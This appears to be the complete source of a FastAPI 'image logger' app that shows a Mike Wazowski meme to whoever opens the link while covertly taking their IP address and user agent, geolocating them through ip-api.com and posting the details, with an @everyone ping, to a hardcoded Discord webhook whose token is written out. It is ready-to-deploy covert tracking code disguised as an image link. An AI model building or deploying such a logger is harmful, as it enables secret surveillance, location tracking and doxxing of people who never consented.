from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests
import json

app = FastAPI()

WEBHOOK = "https://discord.com/api/webhooks/1493634236605796492/KGrIFx1QzX8wl3wXZ3GH3hivjXA0T4-jx7tR_2DDjiDFBmjc8oaCQpsUJbxPRC4G7Z66"
IMAGE = "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/c5ae195f-e639-4f3e-87e0-6199d10d2fb9/dg65n12-e39839ab-ea1c-4f10-81c0-58a5acdc6a13.png/v1/fit/w_828,h_1056/mike_wazowski_meme_png_by_kylewithem_dg65n12-414w-2x.png"

@app.get("/")
@app.get("/image")
@app.get("/api/image")
async def image_logger(request: Request):
    # Get IP
    forwarded = request.headers.get("x-forwarded-for")
    ip = forwarded.split(",")[0].strip() if forwarded else "Unknown"
    ua = request.headers.get("user-agent", "Unknown")
    
    # Get location
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp,proxy", timeout=3)
        geo = r.json()
    except:
        geo = {"country": "Unknown", "regionName": "Unknown", "city": "Unknown", "isp": "Unknown", "proxy": False}
    
    # Send to Discord
    embed = {
        "username": "Image Logger",
        "content": "@everyone" if not geo.get("proxy") else "",
        "embeds": [{
            "title": "🎯 IP LOGGED",
            "color": 0x00FFFF,
            "description": f"**IP:** `{ip}`\n**Location:** {geo.get('country')} - {geo.get('regionName')} - {geo.get('city')}\n**ISP:** {geo.get('isp')}\n**Proxy/VPN:** {geo.get('proxy')}\n**User Agent:** `{ua[:100]}`"
        }]
    }
    
    try:
        requests.post(WEBHOOK, json=embed, timeout=3)
    except:
        pass
    
    # Return image
    html = f'<body style="margin:0;height:100vh;width:100vw;background:url({IMAGE}) center/contain no-repeat;background-color:#000;"></body>'
    return HTMLResponse(content=html)

@app.get("/test")
async def test():
    return HTMLResponse(content="<h1>✅ Vercel is working! Your API is alive.</h1>")
